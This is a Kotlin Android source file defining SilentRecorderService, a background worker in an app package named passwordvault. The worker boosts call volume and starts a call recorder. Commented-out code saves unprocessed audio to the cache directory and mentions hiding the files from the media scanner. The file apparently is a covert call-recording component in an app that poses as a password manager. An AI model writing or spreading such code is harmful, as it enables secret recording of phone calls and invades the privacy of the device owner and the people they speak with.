package com.example.passwordvault.service

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.passwordvault.util.CALL_RECORDER
import com.example.passwordvault.util.Recorder

private val tag = SilentRecorderService::class.java.simpleName

class SilentRecorderService(
    appContext: Context,
    workerParams: WorkerParameters
) :
    Worker(appContext, workerParams) {
    private val context = appContext
//    private lateinit var mediaRecorder: MediaRecorder
//    private lateinit var newFileName: String

    @RequiresApi(Build.VERSION_CODES.N)
    override fun doWork(): Result {
        Log.e("Worker", "doWork()")
//        newFileName = generateFileName(CALL_RECORDER, context)
        Recorder.increaseVolume(CALL_RECORDER, context)
        Recorder.initialize(context, CALL_RECORDER)
        Recorder.prepareRecorder(context)
        return Result.success()
    }

    override fun onStopped() {
        Log.e("Worker", "onStopped()")
        Recorder.stopRecorder()
        super.onStopped()
    }

//    private fun increaseCallVolume() {
//        val audioManager: AudioManager =
//            context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
//        if (audioManager.mode == AudioManager.MODE_IN_CALL || audioManager.mode == AudioManager.MODE_IN_COMMUNICATION)
//            Log.e("Voice Call", "Voice call active")
//        audioManager.setStreamVolume(
//            AudioManager.STREAM_VOICE_CALL,
//            audioManager.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL),
//            0
//        )
//    }

//    private fun initializeMediaRecoder() {
//        mediaRecorder = MediaRecorder()
//        val baseDir = context.externalCacheDir?.absolutePath
////        if (baseDir != null)
////            createNoMediaFile(baseDir)
//        val outputFile = "$baseDir/$newFileName.amr"
//        PreferenceUtil.writeToLatestRecord(outputFile, context)
//        Log.e("Service", "output -> $outputFile")
//        mediaRecorder.apply {
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
//                setAudioSource(MediaRecorder.AudioSource.UNPROCESSED)
//                setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
//                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
//                setOutputFile(outputFile)
//            }
//        }
//    }

//    private fun prepareMediaRecoder() {
//        try {
//            if (Permissions.audioPermission(applicationContext) == PackageManager.PERMISSION_GRANTED) {
//                mediaRecorder.prepare()
//                Thread.sleep(2000)
//                mediaRecorder.start()
//            } else {
//                throw java.lang.IllegalStateException("Doesn't have permission to record voice")
//            }
//        } catch (ise: IllegalStateException) {
//            Log.e("Service", "Exception -> $ise")
//        } catch (ioe: IOException) {
//            Log.e("Service", "Exception -> $ioe")
//        } catch (exe: Exception) {
//            Log.e("Service", "Exception -> $exe")
//        }
//    }

//    private fun generateFileName(): String {
//        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            val dateTime = LocalDateTime.now()
//            dateTime.format(
//                DateTimeFormatter.ofLocalizedDateTime(
//                    FormatStyle.LONG,
//                    FormatStyle.SHORT
//                )
//            )
//        } else {
//            "audiotest"
//        }
//    }
}